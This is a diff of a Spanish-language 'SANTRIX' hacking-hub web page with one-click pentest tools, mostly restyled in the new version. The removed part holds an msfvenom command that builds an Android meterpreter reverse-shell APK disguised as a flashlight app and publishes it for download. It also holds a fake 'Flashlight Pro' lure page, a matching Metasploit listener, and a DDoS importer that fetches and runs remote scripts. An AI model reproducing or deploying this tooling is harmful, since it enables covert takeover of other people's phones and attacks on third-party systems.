@@ -1,507 +1,900 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>SANTRIX CYBERSECURITY HUB</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg-color: #0a0a0a;
-            --accent-color: #00ff41;
-            --text-color: #d1d1d1;
-            --header-bg: #151515;
-            --card-bg: #1c1c1c;
-        }
-        body { 
-            margin: 0; 
-            background: var(--bg-color); 
-            color: var(--text-color);
-            font-family: 'JetBrains Mono', monospace;
-            display: flex;
-            flex-direction: row;
-            height: 100vh;
-            overflow: hidden;
-        }
-        #sidebar {
-            width: 350px;
-            background: var(--header-bg);
-            border-right: 1px solid #333;
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
-            overflow-y: auto;
-            transition: transform 0.3s ease;
-            z-index: 1000;
-        }
-        #main-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            min-width: 0;
-        }
-        .mobile-header {
-            display: none;
-            background: var(--header-bg);
-            padding: 10px;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #333;
-        }
-        .menu-toggle {
-            background: var(--card-bg);
-            color: var(--accent-color);
-            border: 1px solid var(--accent-color);
-            padding: 5px 10px;
-            cursor: pointer;
-            border-radius: 4px;
-        }
-        @media (max-width: 768px) {
-            body {
-                flex-direction: column;
-            }
-            #sidebar {
-                position: fixed;
-                left: 0;
-                top: 0;
-                bottom: 0;
-                transform: translateX(-100%);
-                width: 80%;
-                box-shadow: 5px 0 15px rgba(0,0,0,0.5);
-            }
-            #sidebar.active {
-                transform: translateX(0);
-            }
-            .mobile-header {
-                display: flex;
-            }
-            .tool-card {
-                padding: 15px; /* Larger touch targets */
-            }
-        }
-        .banner {
-            color: var(--accent-color);
-            font-size: 1.5rem;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 20px;
-            border-bottom: 2px solid var(--accent-color);
-            padding-bottom: 10px;
-        }
-        .tool-category {
-            margin-bottom: 25px;
-        }
-        .category-title {
-            color: var(--accent-color);
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            margin-bottom: 10px;
-            display: block;
-            border-left: 3px solid var(--accent-color);
-            padding-left: 10px;
-        }
-        .tool-card {
-            background: #2a2a2a;
-            padding: 12px;
-            border-radius: 4px;
-            margin-bottom: 10px;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: 1px solid #444;
-            color: #fff;
-            display: block;
-            width: 100%;
-            text-align: left;
-            font-family: inherit;
-        }
-        .tool-card:hover {
-            border-color: var(--accent-color);
-            background: #333;
-        }
-        button.tool-card {
-            text-align: center;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-        .tool-name {
-            display: block;
-            font-weight: bold;
-            color: #fff;
-            margin-bottom: 5px;
-        }
-        .tool-desc {
-            font-size: 0.75rem;
-            color: #888;
-            line-height: 1.4;
-        }
-        #terminal-container {
-            flex: 1;
-            background: #000;
-            position: relative;
-        }
-        #terminal {
-            height: 100%;
-            width: 100%;
-        }
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #333;
-            border-radius: 10px;
-        }
-        .ddos-input {
-            background: #000;
-            border: 1px solid #444;
-            color: var(--accent-color);
-            padding: 5px;
-            width: 100%;
-            margin-top: 5px;
-            font-family: inherit;
-            font-size: 0.8rem;
-        }
-    </style>
-</head>
-<body>
-    <div class="mobile-header">
-        <span style="color: var(--accent-color); font-weight: bold;">SANTRIX HUB</span>
-        <button class="menu-toggle" onclick="toggleMenu()">MENU</button>
-    </div>
-    <div id="sidebar">
-        <div class="banner">SANTRIX HUB</div>
-        
-        <div class="tool-category">
-            <span class="category-title">Quick Commands</span>
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
-                <button class="tool-card" style="width: 100%; text-align: center; border: 1px solid #333;" onclick="runCommand('ls -la')">LS</button>
-                <button class="tool-card" style="width: 100%; text-align: center; border: 1px solid #333;" onclick="runCommand('clear')">CLEAR</button>
-                <button class="tool-card" style="width: 100%; text-align: center; border: 1px solid #333;" onclick="runCommand('cd ..')">CD ..</button>
-                <button class="tool-card" style="width: 100%; text-align: center; border: 1px solid #333;" onclick="runCommand('pwd')">PWD</button>
-            </div>
-            <div style="display: flex; gap: 5px; margin-top: 10px;">
-                <button class="tool-card" style="flex: 1; text-align: center; border: 1px solid #333;" onclick="copyTerminal()">COPY</button>
-                <button class="tool-card" style="flex: 1; text-align: center; border: 1px solid #333;" onclick="pasteTerminal()">PASTE</button>
-            </div>
-            <div style="display: flex; gap: 5px; margin-top: 5px; justify-content: center; align-items: center; background: #1c1c1c; padding: 10px; border-radius: 4px;">
-                <button class="tool-card" style="margin:0; padding: 5px 15px;" onclick="simulateKey(38)">↑</button>
-                <button class="tool-card" style="margin:0; padding: 5px 15px;" onclick="simulateKey(40)">↓</button>
-                <button class="tool-card" style="margin:0; padding: 5px 15px; color: #ff4141; border-color: #ff4141;" onclick="sendCtrlC()">CTRL+C</button>
-            </div>
-        </div>
-
-        <div class="tool-category">
-            <span class="category-title">Termux Integration</span>
-            <div class="tool-card" onclick="runCommand('pkg install -y curl && curl -s ' + window.location.origin + '/termux.sh | bash')">
-                <span class="tool-name">Install SANTRIX on Termux</span>
-                <span class="tool-desc">Ejecuta el instalador automático en tu Termux para configurar todo el entorno.</span>
-            </div>
-            <div class="tool-card" onclick="runCommand('./scripts/termux_setup.sh')">
-                <span class="tool-name">Manual Setup Guide</span>
-                <span class="tool-desc">Obtén los comandos para instalar SANTRIX y Metasploit manualmente.</span>
-            </div>
-        </div>
-
-        <div class="tool-category">
-            <span class="category-title">Web Enumeration (HTB/THM)</span>
-            <div class="tool-card">
-                <span class="tool-name">Web Enumerator Pro</span>
-                <span class="tool-desc">Directorios, subdominios y fuzzing. Perfecto para HackTheBox y TryHackMe.</span>
-                <input type="text" id="enum-url" class="ddos-input" placeholder="http://10.10.10.10" style="margin-bottom:5px;">
-                <div style="display:flex; gap:5px; margin-bottom:5px; flex-wrap:wrap;">
-                    <button class="tool-card" style="flex:1; font-size:0.7rem; padding:6px; background:#1a1a2e; border-color:#4444ff;" onclick="runEnum('dir')">DIR</button>
-                    <button class="tool-card" style="flex:1; font-size:0.7rem; padding:6px; background:#1a1a2e; border-color:#4444ff;" onclick="runEnum('dns')">DNS</button>
-                    <button class="tool-card" style="flex:1; font-size:0.7rem; padding:6px; background:#1a1a2e; border-color:#4444ff;" onclick="runEnum('fuzz')">FUZZ</button>
-                    <button class="tool-card" style="flex:1; font-size:0.7rem; padding:6px; background:var(--accent-color); color:#000; border-color:var(--accent-color);" onclick="runEnum('all')">ALL</button>
-                </div>
-            </div>
-            <div class="tool-card" onclick="runCommand('gobuster dir -u ')">
-                <span class="tool-name">Gobuster (Manual)</span>
-                <span class="tool-desc">Lanza gobuster directamente en el terminal para mayor control.</span>
-            </div>
-            <div class="tool-card" onclick="runCommand('ffuf -u FUZZ -w /tmp/santrix_wordlists/common.txt -mc 200,301,403 ')">
-                <span class="tool-name">FFUF (Fuzzer)</span>
-                <span class="tool-desc">Fuzzing rápido con ffuf, el estándar en CTFs.</span>
-            </div>
-        </div>
-
-        <div class="tool-category">
-            <span class="category-title">Security Analysis</span>
-            <div class="tool-card">
-                <span class="tool-name">SANTRIX Audit & Stress</span>
-                <span class="tool-desc">Analiza tu web y genera un reporte de fallos.</span>
-                <input type="text" id="audit-url" class="ddos-input" placeholder="https://tu-web.com" 
-                       onkeypress="if(event.key === 'Enter') runAudit()">
-            </div>
-            <div class="tool-card">
-                <span class="tool-name">SQLi Scanner (SANTRIX)</span>
-                <span class="tool-desc">Escanea una URL o parámetros POST en busca de vulnerabilidades SQLi.</span>
-                <input type="text" id="sqli-url" class="ddos-input" placeholder="URL: http://objetivo.com/login" style="margin-bottom:5px;">
-                <input type="text" id="sqli-post" class="ddos-input" placeholder="POST: user=admin&pass=1" style="margin-bottom:5px;">
-                <div style="display: flex; align-items: center; margin-bottom: 5px;">
-                    <input type="checkbox" id="sqli-evade" style="margin-right: 10px;">
-                    <label for="sqli-evade" style="font-size: 0.8rem; color: var(--accent-color);">MODO EVASIÓN (Hard Mode)</label>
-                </div>
-                <button class="tool-card" style="margin-top:5px; background:var(--accent-color); color:#000;" onclick="runSQLi()">SCAN NOW</button>
-            </div>
-            <div class="tool-card" onclick="runCommand('nmap -F ')">
-                <span class="tool-name">Nmap Scanner</span>
-                <span class="tool-desc">Escaneo rápido de puertos y servicios para identificar vulnerabilidades.</span>
-            </div>
-            <div class="tool-card" onclick="runCommand('curl -I ')">
-                <span class="tool-name">Header Analyzer</span>
-                <span class="tool-desc">Analiza las cabeceras HTTP para detectar configuraciones inseguras.</span>
-            </div>
-            <div class="tool-card" onclick="runCommand('whois ')">
-                <span class="tool-name">Whois Lookup</span>
-                <span class="tool-desc">Información de registro de dominio y red.</span>
-            </div>
-        </div>
-
-        <div class="tool-category">
-            <span class="category-title">DDoS Tools (Educational)</span>
-            <div class="tool-card">
-                <span class="tool-name">SANTRIX DDoS Importer</span>
-                <span class="tool-desc">Pega el enlace del script para importarlo y ejecutarlo.</span>
-                <input type="text" id="ddos-link" class="ddos-input" placeholder="URL del script .sh" 
-                       onkeypress="if(event.key === 'Enter') importDDoS()">
-            </div>
-        </div>
-
-        <div class="tool-category">
-            <span class="category-title">Mobile Experimentation</span>
-            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o public/downloads/flashlight.apk && chmod +r public/downloads/flashlight.apk')">
-                <span class="tool-name">Gen Flashlight APK</span>
-                <span class="tool-desc">Genera un APK camuflajeado como una linterna sencilla.</span>
-            </div>
-            <div class="tool-card" onclick="createFlashlightPage()">
-                <span class="tool-name">Deploy Flashlight Page</span>
-                <span class="tool-desc">Crea una página de descarga para la app de linterna.</span>
-            </div>
-            <script>
-                function createFlashlightPage() {
-                    const content = `
-<!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flashlight Pro - Gratis</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; text-align: center; padding: 40px 20px; }
-        .icon { font-size: 80px; margin-bottom: 20px; }
-        .card { background: #1e1e1e; border: 1px solid #333; padding: 30px; border-radius: 15px; max-width: 400px; margin: 0 auto; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        h1 { color: #fff; margin-bottom: 10px; }
-        p { color: #bbb; line-height: 1.6; }
-        .download-btn { background: #ffcc00; color: #000; padding: 18px 40px; text-decoration: none; font-weight: bold; border-radius: 30px; display: inline-block; margin-top: 25px; transition: transform 0.2s; }
-        .download-btn:active { transform: scale(0.95); }
-        .features { text-align: left; margin-top: 20px; font-size: 14px; color: #888; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SANTRIX CYBERSECURITY HUB</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c14;
+    --bg2: #0f1220;
+    --card: #141828;
+    --border: #1e2540;
+    --green: #00ff87;
+    --cyan: #00d4ff;
+    --purple: #a855f7;
+    --orange: #ff6b35;
+    --pink: #ff2d78;
+    --yellow: #ffd600;
+    --text: #e2e8f0;
+    --muted: #64748b;
+    --radius: 16px;
+    --font: 'JetBrains Mono', monospace;
+    --font-title: 'Orbitron', sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font);
+    height: 100dvh;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  /* ── TOP HEADER ── */
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 16px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+    z-index: 10;
+  }
+  .topbar-logo {
+    font-family: var(--font-title);
+    font-size: 1.1rem;
+    font-weight: 900;
+    background: linear-gradient(90deg, var(--green), var(--cyan));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 2px;
+  }
+  .topbar-actions { display: flex; gap: 8px; }
+  .topbar-btn {
+    background: var(--card);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 6px 12px;
+    border-radius: 8px;
+    font-family: var(--font);
+    font-size: 0.75rem;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .topbar-btn:hover, .topbar-btn.active {
+    border-color: var(--cyan);
+    color: var(--cyan);
+    box-shadow: 0 0 10px rgba(0,212,255,0.2);
+  }
+  .topbar-btn.danger { border-color: var(--pink); color: var(--pink); }
+  .topbar-btn.danger:hover { box-shadow: 0 0 10px rgba(255,45,120,0.3); }
+
+  /* ── MAIN LAYOUT ── */
+  .main {
+    display: flex;
+    flex: 1;
+    overflow: hidden;
+  }
+
+  /* ── TOOLS PANEL ── */
+  #tools-panel {
+    width: 360px;
+    flex-shrink: 0;
+    display: flex;
+    flex-direction: column;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  /* ── CATEGORY TABS ── */
+  .cat-tabs {
+    display: flex;
+    overflow-x: auto;
+    padding: 10px 12px 0;
+    gap: 6px;
+    flex-shrink: 0;
+    scrollbar-width: none;
+  }
+  .cat-tabs::-webkit-scrollbar { display: none; }
+  .cat-tab {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 3px;
+    padding: 8px 12px;
+    border-radius: 12px 12px 0 0;
+    border: 1px solid var(--border);
+    border-bottom: none;
+    background: var(--card);
+    cursor: pointer;
+    transition: all 0.2s;
+    white-space: nowrap;
+    font-size: 0.65rem;
+    color: var(--muted);
+    min-width: 52px;
+    text-align: center;
+  }
+  .cat-tab .tab-icon { font-size: 1.2rem; }
+  .cat-tab.active {
+    background: var(--bg);
+    color: var(--text);
+    border-color: var(--border);
+  }
+  .cat-tab.active[data-cat="enum"]  { border-top: 2px solid var(--cyan); }
+  .cat-tab.active[data-cat="sqli"]  { border-top: 2px solid var(--pink); }
+  .cat-tab.active[data-cat="net"]   { border-top: 2px solid var(--green); }
+  .cat-tab.active[data-cat="exploit"]{ border-top: 2px solid var(--purple); }
+  .cat-tab.active[data-cat="fintech"]{ border-top: 2px solid var(--yellow); }
+  .cat-tab.active[data-cat="sys"]   { border-top: 2px solid var(--orange); }
+  .cat-tab.active[data-cat="termux"]{ border-top: 2px solid var(--green); }
+
+  /* ── TOOLS GRID ── */
+  .tools-scroll {
+    flex: 1;
+    overflow-y: auto;
+    padding: 14px 12px;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+  .cat-page { display: none; }
+  .cat-page.active { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+  /* ── TOOL CARD ── */
+  .tcard {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 14px 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .tcard::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    opacity: 0;
+    transition: opacity 0.2s;
+    border-radius: var(--radius);
+  }
+  .tcard:active { transform: scale(0.96); }
+  .tcard:hover::before { opacity: 1; }
+  .tcard:hover { border-color: var(--c, var(--cyan)); box-shadow: 0 0 18px rgba(var(--crgb, 0,212,255), 0.2); }
+
+  .tcard[data-color="cyan"]   { --c: var(--cyan);   --crgb: 0,212,255; }
+  .tcard[data-color="green"]  { --c: var(--green);  --crgb: 0,255,135; }
+  .tcard[data-color="pink"]   { --c: var(--pink);   --crgb: 255,45,120; }
+  .tcard[data-color="purple"] { --c: var(--purple); --crgb: 168,85,247; }
+  .tcard[data-color="orange"] { --c: var(--orange); --crgb: 255,107,53; }
+  .tcard[data-color="yellow"] { --c: var(--yellow); --crgb: 255,214,0; }
+
+  .tcard-icon {
+    font-size: 2rem;
+    line-height: 1;
+    filter: drop-shadow(0 0 6px rgba(var(--crgb, 0,212,255), 0.5));
+  }
+  .tcard-name {
+    font-size: 0.7rem;
+    font-weight: 700;
+    color: var(--text);
+    line-height: 1.2;
+  }
+  .tcard-badge {
+    position: absolute;
+    top: 7px;
+    right: 7px;
+    font-size: 0.55rem;
+    background: var(--c, var(--cyan));
+    color: #000;
+    padding: 1px 5px;
+    border-radius: 4px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+  }
+
+  /* Wide cards (full-width) */
+  .tcard.wide { grid-column: 1 / -1; flex-direction: row; text-align: left; padding: 12px 14px; gap: 12px; }
+  .tcard.wide .tcard-icon { font-size: 1.6rem; }
+  .tcard.wide .tcard-name { font-size: 0.75rem; }
+
+  /* ── QUICK CMD BAR ── */
+  .qbar {
+    display: flex;
+    gap: 6px;
+    padding: 8px 12px;
+    background: var(--bg);
+    border-top: 1px solid var(--border);
+    flex-shrink: 0;
+    flex-wrap: wrap;
+  }
+  .qbtn {
+    background: var(--card);
+    border: 1px solid var(--border);
+    color: var(--muted);
+    padding: 5px 10px;
+    border-radius: 8px;
+    font-family: var(--font);
+    font-size: 0.7rem;
+    cursor: pointer;
+    transition: all 0.15s;
+    flex: 1;
+    min-width: 44px;
+    text-align: center;
+  }
+  .qbtn:hover { color: var(--text); border-color: #333; }
+  .qbtn.red { color: var(--pink); border-color: rgba(255,45,120,0.3); }
+  .qbtn.red:hover { box-shadow: 0 0 8px rgba(255,45,120,0.3); }
+
+  /* ── TERMINAL ── */
+  #term-panel {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    min-width: 0;
+    background: #000;
+  }
+  .term-topbar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 12px;
+    background: #0a0a0a;
+    border-bottom: 1px solid #1a1a1a;
+    flex-shrink: 0;
+  }
+  .term-dot { width: 10px; height: 10px; border-radius: 50%; }
+  .term-title { font-size: 0.7rem; color: #555; margin-left: 4px; }
+  #terminal { flex: 1; }
+
+  /* ── MODAL ── */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.7);
+    backdrop-filter: blur(4px);
+    z-index: 100;
+    align-items: flex-end;
+    justify-content: center;
+  }
+  .modal-overlay.open { display: flex; }
+  @media(min-width: 769px) {
+    .modal-overlay { align-items: center; }
+    .modal-box { border-radius: var(--radius) !important; max-width: 460px; }
+  }
+  .modal-box {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius) var(--radius) 0 0;
+    padding: 24px 20px 32px;
+    width: 100%;
+    max-width: 500px;
+    animation: slideUp 0.25s ease;
+  }
+  @keyframes slideUp {
+    from { transform: translateY(40px); opacity: 0; }
+    to   { transform: translateY(0);    opacity: 1; }
+  }
+  .modal-head {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+  .modal-icon { font-size: 2rem; }
+  .modal-title { font-family: var(--font-title); font-size: 0.9rem; color: var(--text); }
+  .modal-desc  { font-size: 0.72rem; color: var(--muted); margin-top: 2px; }
+  .modal-close {
+    margin-left: auto;
+    background: none;
+    border: none;
+    color: var(--muted);
+    font-size: 1.3rem;
+    cursor: pointer;
+    line-height: 1;
+    padding: 4px;
+  }
+  .modal-field { margin-bottom: 12px; }
+  .modal-label { font-size: 0.7rem; color: var(--muted); margin-bottom: 5px; display: block; }
+  .modal-input {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 10px 12px;
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 0.82rem;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .modal-input:focus { border-color: var(--cyan); }
+  .modal-checkbox { display: flex; align-items: center; gap: 8px; font-size: 0.75rem; color: var(--text); cursor: pointer; }
+  .modal-checkbox input { width: 16px; height: 16px; accent-color: var(--pink); }
+  .modal-modes { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px; }
+  .mode-btn {
+    flex: 1;
+    min-width: 60px;
+    background: var(--card);
+    border: 1px solid var(--border);
+    color: var(--muted);
+    border-radius: 8px;
+    padding: 7px 6px;
+    font-family: var(--font);
+    font-size: 0.7rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.15s;
+    text-align: center;
+  }
+  .mode-btn.selected, .mode-btn:hover { background: var(--cyan); color: #000; border-color: var(--cyan); }
+  .modal-run {
+    width: 100%;
+    margin-top: 16px;
+    background: linear-gradient(135deg, var(--green), var(--cyan));
+    border: none;
+    border-radius: 12px;
+    padding: 13px;
+    font-family: var(--font-title);
+    font-size: 0.85rem;
+    font-weight: 700;
+    color: #000;
+    cursor: pointer;
+    letter-spacing: 1px;
+    transition: all 0.2s;
+    box-shadow: 0 4px 20px rgba(0,255,135,0.3);
+  }
+  .modal-run:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(0,255,135,0.4); }
+  .modal-run:active { transform: translateY(0); }
+
+  /* ── MOBILE ── */
+  @media(max-width: 768px) {
+    .main { flex-direction: column; }
+    #tools-panel { width: 100%; border-right: none; border-bottom: 1px solid var(--border); height: auto; max-height: 55dvh; }
+    #term-panel { min-height: 45dvh; }
+    .topbar-logo { font-size: 0.9rem; }
+  }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+  /* ── PULSE ANIMATION ── */
+  @keyframes pulse-glow {
+    0%, 100% { box-shadow: 0 0 8px rgba(0,255,135,0.2); }
+    50%       { box-shadow: 0 0 20px rgba(0,255,135,0.5); }
+  }
+  .pulse { animation: pulse-glow 2s infinite; }
+</style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">🔦</div>
-        <h1>Flashlight Pro</h1>
-        <p>La linterna más brillante y rápida para tu Android. Sin anuncios molestos.</p>
-        <div class="features">
-            ✓ Modo estrobo<br>
-            ✓ Luz de pantalla ultra brillante<br>
-            ✓ Brújula integrada
-        </div>
-        <a href="/downloads/flashlight.apk" class="download-btn">INSTALAR AHORA</a>
-    </div>
-</body>
-</html>`;
-                    runCommand("cat << 'EOF' > public/flashlight.html\\n" + content + "\\nEOF");
-                    alert("Página de linterna creada en /flashlight.html. ¡Ábrela en tu móvil!");
-                }
-            </script>
-            <div class="tool-card" onclick="runCommand('msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit\"')">
-                <span class="tool-name">Start Mobile Listener</span>
-                <span class="tool-desc">Prepara SANTRIX para recibir la conexión de tu teléfono.</span>
-            </div>
-        </div>
 
-        <div class="tool-category">
-            <span class="category-title">Mobile App Analysis</span>
-            <div class="tool-card">
-                <span class="tool-name">Mobile API Proxy</span>
-                <span class="tool-desc">Captura el tráfico de tu app móvil para buscar vulnerabilidades SQLi en su backend.</span>
-                <button class="tool-card" style="margin-top:5px; background:var(--accent-color); color:#000;" onclick="runCommand('nmap -p 8080 $(hostname -I)')">START PROXY</button>
-            </div>
-            <div class="tool-card" onclick="runCommand('./scripts/security_audit.sh mobile-api')">
-                <span class="tool-name">Static Analysis (APK)</span>
-                <span class="tool-desc">Analiza el código descompilado en busca de cadenas de conexión inseguras.</span>
-            </div>
-        </div>
+<!-- TOP BAR -->
+<div class="topbar">
+  <span class="topbar-logo">⚡ SANTRIX</span>
+  <div class="topbar-actions">
+    <button class="topbar-btn" onclick="runCommand('clear')">CLR</button>
+    <button class="topbar-btn" onclick="copyTerminal()">COPY</button>
+    <button class="topbar-btn" onclick="pasteTerminal()">PASTE</button>
+    <button class="topbar-btn danger" onclick="sendCtrlC()">✕ STOP</button>
+  </div>
+</div>
 
-        <div class="tool-category">
-            <span class="category-title">Fintech Security</span>
-            <div class="tool-card">
-                <span class="tool-name">Payment Bypass Auditor</span>
-                <span class="tool-desc">Prueba real de manipulación de parámetros y validación de webhooks en tu pasarela.</span>
-                <input type="text" id="payment-url" class="ddos-input" placeholder="https://tu-tienda.com/pay" 
-                       onkeypress="if(event.key === 'Enter') runPaymentBypass()">
-                <button class="tool-card" style="margin-top:5px; background:var(--accent-color); color:#000;" onclick="runPaymentBypass()">TEST GATEWAY</button>
-            </div>
-        </div>
+<div class="main">
 
-        <div class="tool-category">
-            <span class="category-title">System Tools</span>
-            <div class="tool-card" onclick="runCommand('msfconsole')">
-                <span class="tool-name">Metasploit Console</span>
-                <span class="tool-desc">Inicia Metasploit Framework directamente en Replit.</span>
-            </div>
-            <div class="tool-card" onclick="runCommand('msfvenom --help')">
-                <span class="tool-name">MSFVenom (Payloads)</span>
-                <span class="tool-desc">Generador de payloads y troyanos.</span>
-            </div>
-            <div class="tool-card" onclick="runCommand('top')">
-                <span class="tool-name">Process Monitor</span>
-                <span class="tool-desc">Monitoriza el uso de CPU y memoria en tiempo real.</span>
-            </div>
-            <div class="tool-card" onclick="runCommand('ls -la')">
-                <span class="tool-name">File Explorer</span>
-                <span class="tool-desc">Lista todos los archivos, incluyendo los ocultos.</span>
-            </div>
-        </div>
+  <!-- TOOLS PANEL -->
+  <div id="tools-panel">
+
+    <!-- Category Tabs -->
+    <div class="cat-tabs">
+      <div class="cat-tab active" data-cat="enum"   onclick="switchCat('enum')">
+        <span class="tab-icon">🔍</span>ENUM
+      </div>
+      <div class="cat-tab" data-cat="sqli"   onclick="switchCat('sqli')">
+        <span class="tab-icon">💉</span>SQLi
+      </div>
+      <div class="cat-tab" data-cat="net"    onclick="switchCat('net')">
+        <span class="tab-icon">🌐</span>RED
+      </div>
+      <div class="cat-tab" data-cat="exploit" onclick="switchCat('exploit')">
+        <span class="tab-icon">💥</span>EXPLOIT
+      </div>
+      <div class="cat-tab" data-cat="fintech" onclick="switchCat('fintech')">
+        <span class="tab-icon">💳</span>FINTECH
+      </div>
+      <div class="cat-tab" data-cat="sys"    onclick="switchCat('sys')">
+        <span class="tab-icon">🔧</span>SISTEMA
+      </div>
+      <div class="cat-tab" data-cat="termux" onclick="switchCat('termux')">
+        <span class="tab-icon">📱</span>TERMUX
+      </div>
     </div>
 
-    <div id="main-content">
-        <div id="terminal-container">
-            <div id="terminal"></div>
+    <!-- Tool Grids -->
+    <div class="tools-scroll">
+
+      <!-- ENUM -->
+      <div class="cat-page active" id="cat-enum">
+        <div class="tcard" data-color="cyan" onclick="openModal('webenum')">
+          <div class="tcard-badge">PRO</div>
+          <div class="tcard-icon">🕷️</div>
+          <div class="tcard-name">Web Enumerator</div>
         </div>
+        <div class="tcard" data-color="cyan" onclick="openModal('gobuster')">
+          <div class="tcard-icon">📂</div>
+          <div class="tcard-name">Gobuster DIR</div>
+        </div>
+        <div class="tcard" data-color="cyan" onclick="openModal('ffuf')">
+          <div class="tcard-icon">⚡</div>
+          <div class="tcard-name">FFUF Fuzzer</div>
+        </div>
+        <div class="tcard" data-color="cyan" onclick="openModal('gobuster-dns')">
+          <div class="tcard-icon">🔎</div>
+          <div class="tcard-name">Subdominios</div>
+        </div>
+      </div>
+
+      <!-- SQLi -->
+      <div class="cat-page" id="cat-sqli">
+        <div class="tcard wide" data-color="pink" onclick="openModal('sqli')">
+          <div class="tcard-badge">sqlmap</div>
+          <div class="tcard-icon">💉</div>
+          <div>
+            <div class="tcard-name">SQLi Scanner</div>
+            <div style="font-size:0.65rem;color:var(--muted);margin-top:3px;">Detección de inyecciones SQL</div>
+          </div>
+        </div>
+        <div class="tcard" data-color="pink" onclick="openModal('sqli-hard')">
+          <div class="tcard-badge">WAF</div>
+          <div class="tcard-icon">🛡️</div>
+          <div class="tcard-name">Hard Mode (WAF)</div>
+        </div>
+        <div class="tcard" data-color="pink" onclick="openModal('sqli-post')">
+          <div class="tcard-icon">📨</div>
+          <div class="tcard-name">SQLi POST</div>
+        </div>
+      </div>
+
+      <!-- NET -->
+      <div class="cat-page" id="cat-net">
+        <div class="tcard" data-color="green" onclick="openModal('nmap')">
+          <div class="tcard-icon">📡</div>
+          <div class="tcard-name">Nmap Scanner</div>
+        </div>
+        <div class="tcard" data-color="green" onclick="openModal('nmap-full')">
+          <div class="tcard-badge">-A</div>
+          <div class="tcard-icon">🔬</div>
+          <div class="tcard-name">Nmap Completo</div>
+        </div>
+        <div class="tcard" data-color="green" onclick="openModal('headers')">
+          <div class="tcard-icon">📋</div>
+          <div class="tcard-name">HTTP Headers</div>
+        </div>
+        <div class="tcard" data-color="green" onclick="openModal('whois')">
+          <div class="tcard-icon">🌍</div>
+          <div class="tcard-name">Whois Lookup</div>
+        </div>
+        <div class="tcard" data-color="green" onclick="openModal('audit')">
+          <div class="tcard-icon">📊</div>
+          <div class="tcard-name">Audit & Stress</div>
+        </div>
+        <div class="tcard" data-color="green" onclick="openModal('ping')">
+          <div class="tcard-icon">🏓</div>
+          <div class="tcard-name">Ping / Trace</div>
+        </div>
+      </div>
+
+      <!-- EXPLOIT -->
+      <div class="cat-page" id="cat-exploit">
+        <div class="tcard wide" data-color="purple" onclick="runCommand('msfconsole')">
+          <div class="tcard-badge">LIVE</div>
+          <div class="tcard-icon">🐉</div>
+          <div>
+            <div class="tcard-name">Metasploit Console</div>
